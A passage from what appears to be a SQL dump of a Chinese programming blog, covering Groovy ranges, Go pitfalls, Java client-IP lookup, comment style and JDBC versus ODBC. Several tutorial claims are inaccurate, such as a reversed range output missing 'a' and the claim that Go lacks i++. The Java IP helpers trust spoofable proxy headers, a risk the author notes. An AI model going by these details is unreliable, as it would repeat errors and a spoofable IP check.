bRange&nbsp;&nbsp;&nbsp;&nbsp; // 输出: [&quot;a&quot;,&quot;b&quot;,&quot;c&quot;,&quot;d&quot;]</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp; println bRange.class&nbsp;&nbsp; //输出groovy.lang.ObjectRange</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp; assert bRange instanceof List</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>(&#39;a&#39;..&lt;&#39;e&#39;)是 ObjectRange的对象，是特殊的List</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p><span style=\"font-size:medium\"><strong>范围三</strong></span></p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>倒序</p>\r\n\r\n<p>1、def cRange = 5..1</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp; println cRange&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//[5,4,3,2,1]</p>\r\n\r\n<p>2、def dRange&nbsp;=&nbsp;&#39;e&#39;..&#39;a&#39;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //[&quot;e&quot;,&quot;d&quot;,&quot;c&quot;,&quot;b&quot;]</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p><span style=\"font-size:medium\"><strong>范围Range的方法</strong></span></p>\r\n\r\n<pre>\r\n<code class=\"language-java\">def eRange =1..10\r\n\r\nprintln eRange.size()          //10\r\nprintln eRange.contains(5) //true\r\nprintln eRange.get(8)         //9\r\nprintln eRange.getFrom()   //1\r\nprintln eRange.getTo()       //10\r\nprinltn eRange.isReverse() //false\r\nprinltn eRange.subList(3,6)//[4,5,6]</code></pre>\r\n\r\n<p>&nbsp;</p>\r\n',0,0,'Groovy笔记_集合',146,NULL,0),(8,0,'20150608080647',2,'<p><span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">Go作为一种简便灵巧的语言，深受开发者的喜爱。但对于初学者来说，要想轻松驾驭它，还得做好细节学习工作。&nbsp;</span><br />\r\n<br />\r\n<strong>初学者应该注意的地方：</strong><span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">&nbsp;</span></p>\r\n\r\n<ul>\r\n	<li>大括号不能独立成行。</li>\r\n	<li>未使用变量错误&mdash;&mdash;对于全局变量和函数参数变量，是可以定义后不使用的。但是对于函数内部变量来说，如果进行定义后不进行使用，编译器会提示错误。</li>\r\n	<li>导入包未调用错误&mdash;&mdash;导入包后，如果不进行调用，例如函数，接口，结构及变量等对象，那么会出现编译错误。这里建议使用空白表示符&ldquo;_&rdquo;来避免类似错误。</li>\r\n	<li>变量简写只适用于函数内部。</li>\r\n	<li>重新定义变量要使用简写声明&mdash;&mdash;你不能在一个独立的语句中重新定义一个变量，但在复合变量场合是允许的。重新定义的变量需存在于同一区块，否则会产生一个阴影变量。</li>\r\n	<li>意外的变量&mdash;&mdash;变量简写语法由于十分简便，因此很容易会把它作为一个常规的指派操作。虽然可以通过编译，但是其结果却不是我们想要的。</li>\r\n	<li>不能使用&ldquo;nil&rdquo;来定义一个没有类型的变量&mdash;&mdash;&ldquo;nil&rdquo;关键字可用于表示&ldquo;0值&rdquo;，例如在接口，函数，指针等对象中。但如果把它用于定义一个没有进行类型声明的变量，将会导致编译错误，因为编译器无法确定变量类型。</li>\r\n	<li>使用&ldquo;nil&rdquo;切片(Slices)和图(Maps)&mdash;&mdash;为&ldquo;nil&rdquo;切片添加对象是可以的，但对于图来说，这样会造成运行缓慢。</li>\r\n	<li>图容量&mdash;&mdash;可以在创建时设定图的容量，但是不用对图使用cap()。</li>\r\n	<li>字符串不能为&ldquo;nil&rdquo;。</li>\r\n	<li>数组函数参数&mdash;&mdash;对于C/C++开发者来说，数组如同指针；当把数组传入函数时，函数会引用相同的内存位置，所以能够更新原始数据。但在Go中，数组是值，因此当把数组传入函数时，得到的是原始数组数据的副本。因此如果想更新数组数据，这个造成问题。</li>\r\n	<li>切片和数组&ldquo;范围(range)&rdquo;里的异常&mdash;&mdash;在使用for-in或foreach语句时会遇到该问题。在Go中，range的定义是有所不同的。它会产生两个值：第一个为索引项，第二个说项的数据。</li>\r\n	<li>单维度的切片和数&mdash;&mdash;要创建一个动态多维度数组，要使用独立切片。首先，要创建外层切片；然后，要对每个内联切片进行分配。每个内联切片对于其它切片来说是独立的。</li>\r\n	<li>访问不存在的图键&mdash;&mdash;如果想知道一个给定图记录是否存在，应该通过检查来自图访问操作的第二个值。</li>\r\n	<li>不可改变的字符串&mdash;&mdash;如果想通过索引运算符来更新一个字符串变量中的独立字符是会出现错误的，由于字符串是只读的字节片。正确做法是使用一个单字节片进行操作而不是转成字符串类型进行操作。</li>\r\n	<li>字符串和字节片转换&mdash;&mdash;当把字符串转换为字节片时，你得到是一份完整的原始数据。Go提供了一对[]byte to string，string to []byte的优化转换操作，以防止造成额外分配。</li>\r\n	<li>字符串和索引运算符&mdash;&mdash;字符串中的索引运算符返回的是字节值而不是字符。</li>\r\n	<li>字符串不总是UTF8文本&mdash;&mdash;字符串没有被限定为UTF8文本。它们可以包含任何字节。只有当使用字符串常数时才是UTF8文本。</li>\r\n	<li>字符串长度&mdash;&mdash;Go中应使用RuneCountInString()函数来取得字符串长度值而不是len()函数。</li>\r\n	<li>多行切片，数组，和图定义中缺少逗号。</li>\r\n	<li>log.Fatal和log.Panic：日志库提供了不同的日志级别。</li>\r\n	<li>预置数据结构运算是不同步的。</li>\r\n	<li>在range中的字符串迭代值。</li>\r\n	<li>使用for range来进行图迭代。</li>\r\n	<li>Switch语句的注意事项：switch语句的case区块默认是隔断的。</li>\r\n	<li>递增和递减：Go中是不支持i++或++i的递增/减操作的。</li>\r\n	<li>按位不是运算符：很多语言使用~来作为一元逻辑非运算符，而Go中则使用^。</li>\r\n	<li>运算符优先级差异。</li>\r\n	<li>导出结构域是没有编码。</li>\r\n	<li>程序结束时没有销毁Go线程。</li>\r\n	<li>当目标接收器就绪时就发送一个缓冲区通道返回。</li>\r\n	<li>封闭通道发送的问题。</li>\r\n	<li>使用&ldquo;nil&rdquo;通道。</li>\r\n	<li>有值接收器的方法不能用于改变原始值。</li>\r\n</ul>\r\n\r\n<p><br />\r\n<strong>中级开发者应该注意的地方：</strong><span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">&nbsp;</span></p>\r\n\r\n<ul>\r\n	<li>关闭HTTP响应。</li>\r\n	<li>关闭HTTP连接。</li>\r\n	<li>结构，数组，切片和图的比较。</li>\r\n	<li>可以使用==运算符来比较不同的结构变量。</li>\r\n	<li>从异常中恢复。</li>\r\n	<li>可以使用recover()来捕获/拦截异常。</li>\r\n	<li>更新和引用切片，数组，及图&ldquo;range&rdquo;的项值。</li>\r\n	<li>切片的&ldquo;隐藏&rdquo;数据。</li>\r\n	<li>切片数据的错误。</li>\r\n	<li>&ldquo;变味&rdquo;的切片。</li>\r\n	<li>类型声明和方法。</li>\r\n	<li>for switch和for select代码块的终止。</li>\r\n	<li>for语句中的迭代变量和结束。</li>\r\n	<li>延迟的函数调用参数求值。</li>\r\n	<li>延迟函数调用执行。</li>\r\n	<li>错误类型的判断。</li>\r\n	<li>断开的Go线程和资源泄漏。</li>\r\n</ul>\r\n\r\n<p><br />\r\n<strong>高级开发者应该注意的地方：</strong><span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">&nbsp;</span></p>\r\n\r\n<ul>\r\n	<li>对值实例使用指针接收方法。</li>\r\n	<li>更新图值域。</li>\r\n	<li>&ldquo;nil&rdquo;接口和&ldquo;nil&rdquo;接口值。</li>\r\n	<li>堆栈变量。</li>\r\n	<li>GOMAXPROCS,并发，并行化。</li>\r\n	<li>抢先调度。</li>\r\n</ul>\r\n\r\n<p><br />\r\n<strong>以&ldquo;大括号不能独立成行&rdquo;为例：&nbsp;<br />\r\n<br />\r\n错误写法：</strong><span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">&nbsp;</span></p>\r\n\r\n<p>Go代码&nbsp;</p>\r\n\r\n<pre>\r\n<code class=\"language-javascript\">package main\r\n\r\nimport \"fmt\"\r\n\r\nfunc main()  \r\n{ //error, can\'t have the opening brace on a separate line\r\n    fmt.Println(\"hello there!\")\r\n}\r\n</code></pre>\r\n\r\n<p><strong>编译错误提示：</strong><span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">&nbsp;</span><br />\r\n<span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">/tmp/sandbox826898458/main.go:6: syntax error: unexpected semicolon or newline before {&nbsp;</span><br />\r\n<br />\r\n<strong>正确写法：</strong><span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">&nbsp;</span></p>\r\n\r\n<p>Go代码&nbsp;</p>\r\n\r\n<pre>\r\n<code class=\"language-javascript\">package main\r\n\r\nimport \"fmt\"\r\n\r\nfunc main() {  \r\n    fmt.Println(\"works!\")\r\n}\r\n</code></pre>\r\n\r\n<p><span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">如果你经常浏览Go语言官方论坛的文章，或许对上述种种&ldquo;灰色地带&rdquo;不陌生。但是如果是刚接触Go语言，我建议还是要多看官方的教程和多实践。这样对于尽早学会Go语言是很有帮助的。&nbsp;</span><br />\r\n<br />\r\n<span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">本文所列举的这些&rdquo;陷阱&ldquo;是开发者在开发过程中较为常见的，关于如何避免以及如何正确输写，请查看原文</span>devs.cloudimmunity<span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">，由于篇幅较长，笔者并没有逐一翻译，还请谅解。感兴趣的朋友不妨在评论下方发表下自己的看法以及给出解决方法。</span></p>\r\n',0,0,'Go语言开发常见陷阱，你遇到过几个？',179,NULL,0),(9,0,'20150608080927',2,'<p><span style=\"color:rgb(51, 51, 51); font-family:microsoft yahei\">Java 如何获取客户端IP呢?&nbsp;</span></p>\r\n\r\n<p>核心思想:通过HTTP的request来获取<br />\r\n<span style=\"color:rgb(51, 51, 51); font-family:microsoft yahei\">下面是我总结的几种方法:</span></p>\r\n\r\n<pre>\r\n<code class=\"language-java\">/**\r\n     * 获取客户端ip地址(可以穿透代理)\r\n     * \r\n     * @param request\r\n     * @return\r\n     */\r\n    public static String getRemoteAddr(HttpServletRequest request) {\r\n        String ip = request.getHeader(\"X-Forwarded-For\");\r\n        if (ip == null || ip.length() == 0 || \"unknown\".equalsIgnoreCase(ip)) {\r\n            ip = request.getHeader(\"Proxy-Client-IP\");\r\n        }\r\n        if (ip == null || ip.length() == 0 || \"unknown\".equalsIgnoreCase(ip)) {\r\n            ip = request.getHeader(\"WL-Proxy-Client-IP\");\r\n        }\r\n        if (ip == null || ip.length() == 0 || \"unknown\".equalsIgnoreCase(ip)) {\r\n            ip = request.getHeader(\"HTTP_CLIENT_IP\");\r\n        }\r\n        if (ip == null || ip.length() == 0 || \"unknown\".equalsIgnoreCase(ip)) {\r\n            ip = request.getHeader(\"HTTP_X_FORWARDED_FOR\");\r\n        }\r\n        if (ip == null || ip.length() == 0 || \"unknown\".equalsIgnoreCase(ip)) {\r\n            ip = request.getRemoteAddr();\r\n        }\r\n        return ip;\r\n    }\r\n    private static final String[] HEADERS_TO_TRY = { \r\n        \"X-Forwarded-For\",\r\n        \"Proxy-Client-IP\",\r\n        \"WL-Proxy-Client-IP\",\r\n        \"HTTP_X_FORWARDED_FOR\",\r\n        \"HTTP_X_FORWARDED\",\r\n        \"HTTP_X_CLUSTER_CLIENT_IP\",\r\n        \"HTTP_CLIENT_IP\",\r\n        \"HTTP_FORWARDED_FOR\",\r\n        \"HTTP_FORWARDED\",\r\n        \"HTTP_VIA\",\r\n        \"REMOTE_ADDR\",\r\n        \"X-Real-IP\"};\r\n\r\n    /***\r\n     * 获取客户端ip地址(可以穿透代理)\r\n     * @param request\r\n     * @return\r\n     */\r\n    public static String getClientIpAddress(HttpServletRequest request) {\r\n        for (String header : HEADERS_TO_TRY) {\r\n            String ip = request.getHeader(header);\r\n            if (ip != null &amp;&amp; ip.length() != 0 &amp;&amp; !\"unknown\".equalsIgnoreCase(ip)) {\r\n                return ip;\r\n            }\r\n        }\r\n        return request.getRemoteAddr();\r\n    }\r\n    /***\r\n     * 获取客户端ip地址(可以穿透代理)\r\n     * @param request\r\n     * @return\r\n     */\r\n    public static String getClientIpAddr(HttpServletRequest request) {  \r\n        String ip = request.getHeader(\"X-Forwarded-For\");  \r\n        if (ip == null || ip.length() == 0 || \"unknown\".equalsIgnoreCase(ip)) {  \r\n            ip = request.getHeader(\"Proxy-Client-IP\");  \r\n        }  \r\n        if (ip == null || ip.length() == 0 || \"unknown\".equalsIgnoreCase(ip)) {  \r\n            ip = request.getHeader(\"WL-Proxy-Client-IP\");  \r\n        }  \r\n        if (ip == null || ip.length() == 0 || \"unknown\".equalsIgnoreCase(ip)) {  \r\n            ip = request.getHeader(\"HTTP_X_FORWARDED_FOR\");  \r\n        }  \r\n        if (ip == null || ip.length() == 0 || \"unknown\".equalsIgnoreCase(ip)) {  \r\n            ip = request.getHeader(\"HTTP_X_FORWARDED\");  \r\n        }  \r\n        if (ip == null || ip.length() == 0 || \"unknown\".equalsIgnoreCase(ip)) {  \r\n            ip = request.getHeader(\"HTTP_X_CLUSTER_CLIENT_IP\");  \r\n        }  \r\n        if (ip == null || ip.length() == 0 || \"unknown\".equalsIgnoreCase(ip)) {  \r\n            ip = request.getHeader(\"HTTP_CLIENT_IP\");  \r\n        }  \r\n        if (ip == null || ip.length() == 0 || \"unknown\".equalsIgnoreCase(ip)) {  \r\n            ip = request.getHeader(\"HTTP_FORWARDED_FOR\");  \r\n        }  \r\n        if (ip == null || ip.length() == 0 || \"unknown\".equalsIgnoreCase(ip)) {  \r\n            ip = request.getHeader(\"HTTP_FORWARDED\");  \r\n        }  \r\n        if (ip == null || ip.length() == 0 || \"unknown\".equalsIgnoreCase(ip)) {  \r\n            ip = request.getHeader(\"HTTP_VIA\");  \r\n        }  \r\n        if (ip == null || ip.length() == 0 || \"unknown\".equalsIgnoreCase(ip)) {  \r\n            ip = request.getHeader(\"REMOTE_ADDR\");  \r\n        }  \r\n        if (ip == null || ip.length() == 0 || \"unknown\".equalsIgnoreCase(ip)) {  \r\n            ip = request.getRemoteAddr();  \r\n        }  \r\n        return ip;  \r\n    }\r\n    public static String getIpAddr(HttpServletRequest request) {\r\n        String ip = request.getHeader(\"X-Real-IP\");\r\n        if (null != ip &amp;&amp; !\"\".equals(ip.trim())\r\n                &amp;&amp; !\"unknown\".equalsIgnoreCase(ip)) {\r\n            return ip;\r\n        }\r\n        ip = request.getHeader(\"X-Forwarded-For\");\r\n        if (null != ip &amp;&amp; !\"\".equals(ip.trim())\r\n                &amp;&amp; !\"unknown\".equalsIgnoreCase(ip)) {\r\n            // get first ip from proxy ip\r\n            int index = ip.indexOf(\',\');\r\n            if (index != -1) {\r\n                return ip.substring(0, index);\r\n            } else {\r\n                return ip;\r\n            }\r\n        }\r\n        return request.getRemoteAddr();\r\n    }</code></pre>\r\n\r\n<p><span style=\"background-color:rgb(239, 239, 239); font-family:microsoft yahei; font-size:14px\">我使用的是spring MVC框架,测试的控制器代码如下:</span><span style=\"background-color:rgb(239, 239, 239); font-family:microsoft yahei; font-size:14px\">&nbsp;</span></p>\r\n\r\n<pre>\r\n<code class=\"language-java\">package com.web.controller;\r\n\r\nimport java.util.HashMap;\r\nimport java.util.Map;\r\n\r\nimport javax.servlet.http.HttpServletRequest;\r\n\r\nimport org.springframework.stereotype.Controller;\r\nimport org.springframework.web.bind.annotation.RequestMapping;\r\nimport org.springframework.web.bind.annotation.ResponseBody;\r\n\r\nimport com.common.util.SystemHWUtil;\r\nimport com.common.util.WebServletUtil;\r\nimport com.string.widget.util.ValueWidget;\r\nimport com.util.JSONPUtil;\r\n/***\r\n * 用于测试跨域\r\n * @author huangweii\r\n * 2015年5月29日\r\n */\r\n@Controller\r\n@RequestMapping(\"/cors\")\r\npublic class CORSController {\r\n    @ResponseBody\r\n    @RequestMapping(value = \"/simple\",produces=SystemHWUtil.RESPONSE_CONTENTTYPE_JSON_UTF)\r\n    public String corsJsonSimple(HttpServletRequest request,String callback){\r\n        String content;\r\n        Map map=new HashMap();\r\n        map.put(\"username\", \"黄威\");\r\n        map.put(\"age\", \"27\");\r\n        map.put(\"address\", \"beijing\");\r\n        content=JSONPUtil.getJsonP(map, callback);\r\n        System.out.println(\"getIpAddr:\"+WebServletUtil.getIpAddr(request));\r\n        System.out.println(\"getRemoteAddr:\"+WebServletUtil.getRemoteAddr(request));\r\n        System.out.println(\"getClientIpAddr:\"+WebServletUtil.getClientIpAddr(request));\r\n        System.out.println(\"getClientIpAddress:\"+WebServletUtil.getClientIpAddress(request));\r\n        return content;\r\n    }\r\n\r\n}</code></pre>\r\n\r\n<p><span style=\"background-color:rgb(239, 239, 239); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">这种方式获取IP地址有被欺骗的可能。</span><br />\r\n<span style=\"background-color:rgb(239, 239, 239); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">每次请求都人为设定一个请求头X-Forwarded-For的值，那么后台获取到的可能就是一个伪造的IP地址。</span><br />\r\n<span style=\"background-color:rgb(239, 239, 239); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">最安全的还是直接获取getRemoteAddr的地址，如果是在nginx后面可以直接使用X-Real-IP头值或其他自定义的请求头。</span><br />\r\n<span style=\"background-color:rgb(239, 239, 239); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">对使用代理请求的不进行区分，如果要求比较高可以把代理信息记录到日志</span></p>\r\n\r\n<p>&nbsp;</p>\r\n',0,0,'Java获取用户ip',159,NULL,0),(10,0,'20150608081325',2,'<p><span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">代码注释，可以说是比代码本身更重要。这里有一些方法可以确保你写在代码中的注释是友好的：&nbsp;</span><br />\r\n<strong>不要重复阅读者已经知道的内容</strong><span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">&nbsp;</span><br />\r\n<br />\r\n<span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">能明确说明代码是做什么的注释对我们是没有帮助的。&nbsp;</span></p>\r\n\r\n<pre>\r\n<code class=\"language-java\">// If the color is red, turn it green\r\nif (color.is_red()) {\r\n  color.turn_green();\r\n}\r\n</code></pre>\r\n\r\n<p><strong>要注释说明推理和历史</strong><span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">&nbsp;</span><br />\r\n<br />\r\n<span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">如果代码中的业务逻辑以后可能需要更新或更改，那就应该留下注释：&nbsp;</span></p>\r\n\r\n<pre>\r\n<code class=\"language-java\">/* The API currently returns an array of items\r\neven though that will change in an upcoming ticket.\r\nTherefore, be sure to change the loop style here so that\r\nwe properly iterate over an object */\r\n\r\nvar api_result = {items: [\"one\", \"two\"]},\r\n    items = api_result.items,\r\n    num_items = items.length;\r\n\r\nfor(var x = 0; x &lt; num_items; x++) {\r\n  ...\r\n}\r\n</code></pre>\r\n\r\n<p><strong>同一行的注释不要写得很长</strong><span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">&nbsp;</span><br />\r\n<br />\r\n<span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">没什么比拖动水平滚动条来阅读注释更令开发人员发指的了。事实上，大多数开发人员都会选择忽略这类注释，因为读起来真的很不方便。&nbsp;</span></p>\r\n\r\n<pre>\r\n<code class=\"language-java\">function Person(name) {\r\n  this.name = name;\r\n  this.first_name = name.split(\" \")[0]; // This is just a shot in the dark here. If we can extract the first name, let\'s do it\r\n}\r\n</code></pre>\r\n\r\n<p><strong>要把长注释放在逻辑上面，短注释放在后面</strong><span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">&nbsp;</span><br />\r\n<br />\r\n<span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">注释如果不超过120个字符那可以放在代码旁边。否则，就应该直接把注释放到语句上面。&nbsp;</span></p>\r\n\r\n<pre>\r\n<code class=\"language-java\">if (person.age &lt; 21) {\r\n  person.can_drink = false; // 21 drinking age\r\n\r\n  /* Fees are given to those under 25, but only in\r\n     some states. */\r\n  person.has_car_rental_fee = function(state) {\r\n    if (state === \"MI\") {\r\n      return true;\r\n    }\r\n  };\r\n}\r\n</code></pre>\r\n\r\n<p><strong>不要为了注释而添加不必要的注释</strong><span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">&nbsp;</span><br />\r\n<br />\r\n<span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">画蛇添足的注释会造成混乱。也许在学校里老师教你要给所有语句添加注释，这会帮助开发人员更好地理解。但这是错的。谁要这么说，那你就立马上给他个两大耳刮子。代码应该保持干净简洁，这是毋庸置疑的。如果你的代码需要逐行解释说明，那么你最需要做的是重构。&nbsp;</span></p>\r\n\r\n<div contenteditable=\"false\" tabindex=\"-1\">\r\n<pre data-widget=\"codeSnippet\">\r\n<code class=\"hljs language-java\"><span class=\"hljs-keyword\">if</span> (person.age &gt;= <span class=\"hljs-number\">21</span>) {\r\n  person.can_drink = <span class=\"hljs-keyword\">true</span>; <span class=\"hljs-comment\">// A person can drink at 21</span>\r\n  person.can_smoke = <span class=\"hljs-keyword\">true</span>; <span class=\"hljs-comment\">// A person can smoke at 18</span>\r\n  person.can_wed = <span class=\"hljs-keyword\">true</span>; <span class=\"hljs-comment\">// A person can get married at 18</span>\r\n  person.can_see_all_movies = <span class=\"hljs-keyword\">true</span>; <span class=\"hljs-comment\">// A person can see all movies at 17</span>\r\n  <span class=\"hljs-comment\">//I hate babies and children and all things pure because I comment too much</span>\r\n}\r\n</code></pre>\r\n<img src=\"data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==\" /><span style=\"background-color:rgba(220, 220, 220, 0.498039); background-image:url(http://www.codertostar.com/assets/lib/ckeditor/plugins/widget/images/handle.png); background-position:initial initial; background-repeat:initial initial; left:0px; top:-15px\"><img src=\"data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==\" style=\"height:15px; width:15px\" title=\"点击并拖拽以移动\" /></span></div>\r\n\r\n<p><strong>注释要拼写正确</strong><span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">&nbsp;</span><br />\r\n<br />\r\n<span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">不要为代码注释中的拼写错误找借口。IDE可以为你检查拼写。如果没有这个功能，那就去下载插件，自己动手！&nbsp;</span><br />\r\n<br />\r\n<strong>要多多练习</strong><span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">&nbsp;</span><br />\r\n<br />\r\n<span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">熟能生巧。试着写一些有用的注释，可以问问其他开发人员你的注释是否有用。随着时间的推移，你会慢慢懂得怎样才算是友好的注释。&nbsp;</span><br />\r\n<br />\r\n<strong>要审查别人的注释</strong><span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">&nbsp;</span><br />\r\n<br />\r\n<span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">在代码审查时，我们往往会忽略查看注释。不要怕要求更多的注释，你应该提出质疑。如果每个人都养成写好注释的好习惯，那么世界将会更美好。&nbsp;</span><br />\r\n<br />\r\n<strong>总结</strong><span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">&nbsp;</span><br />\r\n<br />\r\n<span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">注释是开发进程中非常重要的一部分，但我们不应该为了注释而注释。注释应该是有用的，简洁的，应该是对代码的一种补充。注释不应该用于逐行地解释代码，相反，它应该用于解释业务逻辑，推理以及对将来的启示。&nbsp;</span><br />\r\n&nbsp;</p>\r\n',0,0,'代码注释中的5要与3不要',146,NULL,0),(11,0,'20150608081927',2,'<p><span style=\"font-family:arial,helvetica,sans-serif\"><span style=\"font-size:18px\"><strong>JDBC简介</strong></span></span></p>\r\n\r\n<p><span style=\"font-family:arial,helvetica,sans-serif\"><span style=\"font-size:18px\"><strong>JDBC（Java Data Base Connectivity,java数据库连接）是一种用于执行SQL语句的Java API，它是Java十三个规范之一。可以为多种关系数据库提供统一访问，它由一组用Java语言编写的类和接口组成。JDBC提供了一种基准，据此可以构建更高级的工具和接口，使数据库开发人员能够编写数据库应用程序，同时，JDBC也是个商标名。</strong></span></span></p>\r\n\r\n<p><span style=\"font-family:arial,helvetica,sans-serif\"><span style=\"font-size:18px\"><strong>ODBC简介</strong></span></span></p>\r\n\r\n<p><span style=\"font-family:arial,helvetica,sans-serif\"><span style=\"font-size:18px\"><strong>开放数据库互连（Open Database Connectivity，ODBC）是微软公司开放服务结构（WOSA，Windows Open Services Architecture）中有关数据库的一个组成部分，它建立了一组规范，并提供了一组对数据库访问的标准API（应用程序编程接口）。这些API利用SQL来完成其大部分任务。ODBC本身也提供了对SQL语言的支持，用户可以直接将SQL语句送给ODBC。开放数据库互连（ODBC）是Microsoft提出的数据库访问接口标准。开放数据库互连定义了访问数据库API的一个规范，这些API独立于不同厂商的DBMS，也独立于具体的编程语言（但是Microsoft的ODBC文档是用C语言描述的，许多实际的ODBC驱动程序也是用C语言写的。）ODBC规范后来被X/OPEN和ISO/IEC采纳，作为SQL标准的一部分，具体内容可以参看《ISO/IEC 9075-3:1995 (E) Call-Level Interface (SQL/CLI)》等相关的标准文件。</strong></span></span></p>\r\n\r\n<p><span style=\"font-family:arial,helvetica,sans-serif\"><span style=\"font-size:18px\"><strong>两者之间的联系</strong></span></span></p>\r\n\r\n<p><span style=\"font-family:arial,helvetica,sans-serif\"><span style=\"font-size:18px\"><strong>JDBC和ODBC都是用来连接数据库的启动程序，JDBC和ODBC由于具有数据库独立性甚至平台无关性，因而对Internet上异构数据库的访问提供了很好的支持。</strong></span></span></p>\r\n\r\n<p><span style=\"font-family:arial,helvetica,sans-serif\"><span style=\"font-size:18px\"><strong>两者之间的区别</strong></span></span></p>\r\n\r\n<p><span style=\"font-family:arial,helvetica,sans-serif\"><span style=\"font-size:18px\"><strong>1.JDBC比ODBC更容易理解</strong></span></span></p>\r\n\r\n<p><span style=\"font-family:arial,helvetica,sans-serif\"><span style=\"font-size:18px\"><strong>从事编程工作的朋友都知道Java比C语言更好学，主要是因为Java语言是面向对象的更接近人的思维认识，更容易被人接受。而C语言就较为抽象，跟人的认识思维相差较大，其开发出来的产品也具有类似特点。在ODBC中一个的简单的查询，也需求分为好几块内容;而在ODBC驱动程序内部再去整合，做一些复杂的操作。这不仅降低了数据库启动程序的性能，而且也给程序开发者开发实际运用程序带来了确定的负面效果。而JDBC数据库启动程序在设计的时间就包含了大部份基本数据操作功能，为此在编写一些常规的数据库操作语句时，如查询、更新等等，其所需求的源代码比 ODBC要少的多。故从这方面来说，JDBC数据库启动程序要比ODBC简易理解。</strong></span></span></p>\r\n\r\n<p><span style=\"font-family:arial,helvetica,sans-serif\"><span style=\"font-size:18px\"><strong>2.JDBC数据库驱动程序是面向对象的</strong></span></span></p>\r\n\r\n<p><span style=\"font-family:arial,helvetica,sans-serif\"><span 